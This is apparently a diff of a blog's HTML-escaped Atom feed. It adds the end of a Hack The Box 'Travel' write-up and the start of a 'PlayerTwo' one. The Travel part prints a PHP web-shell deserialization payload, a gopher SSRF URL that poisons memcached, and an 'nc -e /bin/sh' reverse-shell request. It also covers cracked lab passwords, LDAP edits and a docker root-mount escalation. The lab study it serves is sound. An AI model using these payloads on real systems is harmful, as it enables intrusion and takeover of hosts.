+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Basically,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;latter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'O'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;means&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;object,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'s'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;digit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;following&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;tells&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;how&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;many&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;object/string&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;consists&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;O:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;TemplateHelper&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;s:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;s:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;this.php&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;s:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;s:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system($_GET['this']); ?&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;This payload creates a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this.php&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logs&lt;/code&gt; folder containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;?php system($_GET['this']); ?&amp;gt;&lt;/code&gt;. This way we can get a reverse shell in three steps, after URL encoding:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Overwriting the cache&lt;/span&gt;
+http://blog.travel.htb/awesome-rss/?debug&amp;amp;custom_feed_url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;gopher://0.0.0.0:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20102%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22this.php%22%3Bs:4:%22data%22%3Bs:31:%22%3C%3Fphp%20system%28%24_GET%5B%27this%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+&lt;span class=&quot;c&quot;&gt;# Command execution via `nc -e` reverse shell&lt;/span&gt;
+http://blog.travel.htb/wp-content/themes/twentytwenty/logs/this.php?this&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nc%20-e%20/bin/sh%20YOUR_IP%201234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 1234
+Ncat: Version 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.10.189.
+Ncat: Connection from 10.10.10.189:57904.
+&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;this.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;on-the-box&quot;&gt;On the box&lt;/h2&gt;
+&lt;p&gt;This was hard work but the steps to user are walked fast: A bit of enumeration shows an unusual SQL dump in /opt:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;INSERT INTO &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;wp_users&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; VALUES &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1,&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'admin@travel.htb'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'http://localhost'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'2020-04-13 13:19:01'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,0,&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2,&lt;span class=&quot;s1&quot;&gt;'lynik-admin'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'lynik-admin'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'lynik@travel.htb'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'2020-04-13 13:36:18'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,0,&lt;span class=&quot;s1&quot;&gt;'Lynik Schmidt'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;Cracking the PW of lynik-admin with john and the usual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; results in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1stepcloser&lt;/code&gt; which made me smirk. This is his ssh password and we obtain the user flag, now smiling.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lynik-admin@travel:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h1 id=&quot;root-part&quot;&gt;Root part.&lt;/h1&gt;
+&lt;p&gt;It’s a good habit to start looking where you land and here, it paid big time:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lynik-admin@travel:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  ..  .bash_history  .bash_logout  .bashrc  .cache  .ldaprc  .profile  user.txt  .viminfo
+lynik-admin@travel:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .ldaprc 
+HOST ldap.travel.htb
+BASE &lt;span class=&quot;nv&quot;&gt;dc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;travel,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+BINDDN &lt;span class=&quot;nv&quot;&gt;cn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lynik-admin,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;travel,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;To verify we are on the right track we look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; to see if/how the domain is resolved:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lynik-admin@travel:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 travel
+172.20.0.10 ldap.travel.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;connecting-the-dots&quot;&gt;Connecting the dots&lt;/h2&gt;
+&lt;p&gt;We start out by trying to query the ldap service right away and are greeted by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid credentials&lt;/code&gt; using several passwords we found along the way:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lynik-admin@travel:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldapsearch ldap.travel.htb &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cn=lynik-admin,dc=travel,dc=htb&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uid=lynik-admin&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 1stepcloser
+ldap_bind: Invalid credentials &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;49&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Thus we investigate our home directory even more and find the LDAP password inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.viminfo&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lynik-admin@travel:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .viminfo 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snip]
+&lt;span class=&quot;c&quot;&gt;# Registers:&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;1     LINE    0
+        BINDPW Theroadlesstraveled
+|3,1,1,1,1,0,1587670528,&lt;span class=&quot;s2&quot;&gt;&quot;BINDPW Theroadlesstraveled&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now, the above &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; command works using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Theroadlesstraveled&lt;/code&gt; as password. We notice a bunch of users and that lynik-admin is a LDAP admin:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://ldap.travel.htb &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cn=lynik-admin,dc=travel,dc=htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; Theroadlesstraveled
+&lt;span class=&quot;c&quot;&gt;# lynik-admin, travel.htb&lt;/span&gt;
+dn: &lt;span class=&quot;nv&quot;&gt;cn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lynik-admin,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;travel,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+description: LDAP administrator
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: lynik-admin
+userPassword:: &lt;span class=&quot;nv&quot;&gt;e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# -&amp;gt; Theroadlesstraveled&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snip]
+
+&lt;span class=&quot;c&quot;&gt;# domainusers, groups, linux, servers, travel.htb&lt;/span&gt;
+dn: &lt;span class=&quot;nv&quot;&gt;cn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;domainusers,ou&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;,ou&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux,ou&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;servers,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;travel,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+memberUid: frank
+memberUid: brian
+memberUid: christopher
+memberUid: johnny
+memberUid: julia
+memberUid: jerry
+memberUid: louise
+memberUid: eugene
+memberUid: edward
+memberUid: gloria
+memberUid: lynik
+gidNumber: 5000
+cn: domainusers
+objectClass: top
+objectClass: posixGroup
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Also &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getent passwd&lt;/code&gt; shows the users from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getent group&lt;/code&gt; lists them in the group &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;domainusers&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;frank:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5001:5000:Frank Stewart:/home@TRAVEL/frank:/bin/bash
+gloria:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5010:5000:Gloria Wood:/home@TRAVEL/gloria:/bin/bash
+jane:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5005:5000:Jane Rodriguez:/home@TRAVEL/jane:/bin/bash
+christopher:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5003:5000:Christopher Ward:/home@TRAVEL/christopher:/bin/bash
+jerry:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5006:5000:Jerry Morgan:/home@TRAVEL/jerry:/bin/bash
+lynik:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5000:5000:Lynik Schmidt:/home@TRAVEL/lynik:/bin/bash
+johnny:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5004:5000:Johnny Miller:/home@TRAVEL/johnny:/bin/bash
+eugene:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5008:5000:Eugene Scott:/home@TRAVEL/eugene:/bin/bash
+brian:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5002:5000:Brian Bell:/home@TRAVEL/brian:/bin/bash
+louise:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5007:5000:Louise Griffin:/home@TRAVEL/louise:/bin/bash
+edward:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5009:5000:Edward Roberts:/home@TRAVEL/edward:/bin/bash
+
+domainusers:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:5000:frank,brian,christopher,johnny,jerry,louise,eugene,edward,gloria,lynik,julia
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So after reading up a bit, to see what we can do with our privileges, the following seems most promising:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;modifying their UID and GID -&amp;gt; even if we can’t become root directly we might be able to exploit docker/lxd&lt;/li&gt;
+  &lt;li&gt;adding SSH public keys -&amp;gt; to log in&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;These two options will indeed elevate us to root. In order to modify the attributes of users using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapmodify&lt;/code&gt; command we need to create so called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ldif&lt;/code&gt; files:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapmodify &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://ldap.travel.htb &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cn=lynik-admin,dc=travel,dc=htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; Theroadlesstraveled &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; file.ldif &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# SSH.ldif&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# adding SSH key&lt;/span&gt;
+dn: &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;frank,ou&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,ou&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux,ou&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;servers,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;travel,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+changeType: modify
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: your-public-key
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I tried a couple of GIDs (0, lxd..) first but docker was the one that opened the path to root for me.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Group.ldif&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# replacing GID by 117 (docker)&lt;/span&gt;
+dn: &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;frank,ou&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,ou&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux,ou&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;servers,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;travel,dc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+changeType: modify
+replace: gidNumber
+gidNumber: 117
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And we can now log into the box as frank and take a look at the available docker images. Mounting the appropriate one gets the job done:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;frank@travel:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker images
+REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
+nginx                 latest              602e111c06b6        3 months ago        127MB
+memcached             latest              ac4488374c89        3 months ago        82.3MB
+blog                  latest              4225bf7c5157        3 months ago        981MB
+ubuntu                18.04               4e5021d210f6        4 months ago        64.2MB
+jwilder/nginx-proxy   alpine              a7a1c0b44c8a        5 months ago        54.6MB
+osixia/openldap       latest              4c780dfa5f5e        9 months ago        275MB
+
+frank@travel:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /:/mnt &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; ubuntu:18.04
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snip]
+root@998315a25191:/# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /mnt/root/
+bin  root.txt  snap
+root@998315a25191:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /mnt/root/root.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;redacted]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;resources&quot;&gt;Resources&lt;/h1&gt;
+&lt;h2 id=&quot;nmap-scan&quot;&gt;&lt;a name=&quot;Nmap scan&quot;&gt;&lt;/a&gt;Nmap scan&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Jun 28 12:15:54 2020 as: nmap -sC -sV -oN initial.nmap -p- -Pn 10.10.10.189
+Nmap scan report for travel (10.10.10.189)
+Host is up (0.024s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     nginx 1.17.6
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB
+443/tcp open  ssl/http nginx 1.17.6
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB - SSL coming soon.
+| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
+| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
+| Not valid before: 2020-04-23T19:24:29
+|_Not valid after:  2030-04-21T19:24:29
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jun 28 12:16:20 2020 -- 1 IP address (1 host up) scanned in 25.93 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;tools-and-reading&quot;&gt;Tools and reading&lt;/h2&gt;
+&lt;p&gt;&lt;a name=&quot;[0]&quot;&gt;[0]&lt;/a&gt; &lt;a href=&quot;https://github.com/arthaud/git-dumper&quot;&gt;Git-dumper&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&quot;[1]&quot;&gt;[1]&lt;/a&gt; &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery&quot;&gt;Bypassing SSRF restrictions&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&quot;[2]&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://github.com/tarunkant/Gopherus&quot;&gt;Gopherus - creating SSRF payloads&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&quot;[3]&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a&quot;&gt;Post on exploiting PHP deserialization&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&quot;[4]&quot;&gt;[4]&lt;/a&gt; &lt;a href=&quot;https://www.unserialize.com/&quot;&gt;Tool to view your serialized string&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="memcached" /><category term="docker" /><category term="ldap" /><summary type="html">Write-up of the box Travel from Hack The Box</summary></entry><entry><title type="html">HackTheBox - PlayerTwo</title><link href="http://localhost:4000/boxes/player2/" rel="alternate" type="text/html" title="HackTheBox - PlayerTwo" /><published>2020-06-26T21:33:36-04:00</published><updated>2020-06-26T21:33:36-04:00</updated><id>http://localhost:4000/boxes/player2</id><content type="html" xml:base="http://localhost:4000/boxes/player2/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;&lt;em&gt;PlayerTwo&lt;/em&gt; is MrR3boot’s follow-up box to his box &lt;em&gt;Player&lt;/em&gt; - this time created in collaboration with b14ckh34rt.
 It requires quite a bit of fuzzing and research on twirp to start the box, a little bit of binary exploitation for user and and even more so to get root without cheat codes.&lt;/p&gt;
 
@@ -257,7 +534,7 @@ observer@player2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class
 2
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h2 id=&quot;playing-the-game&quot;&gt;Playing the game&lt;/h2&gt;
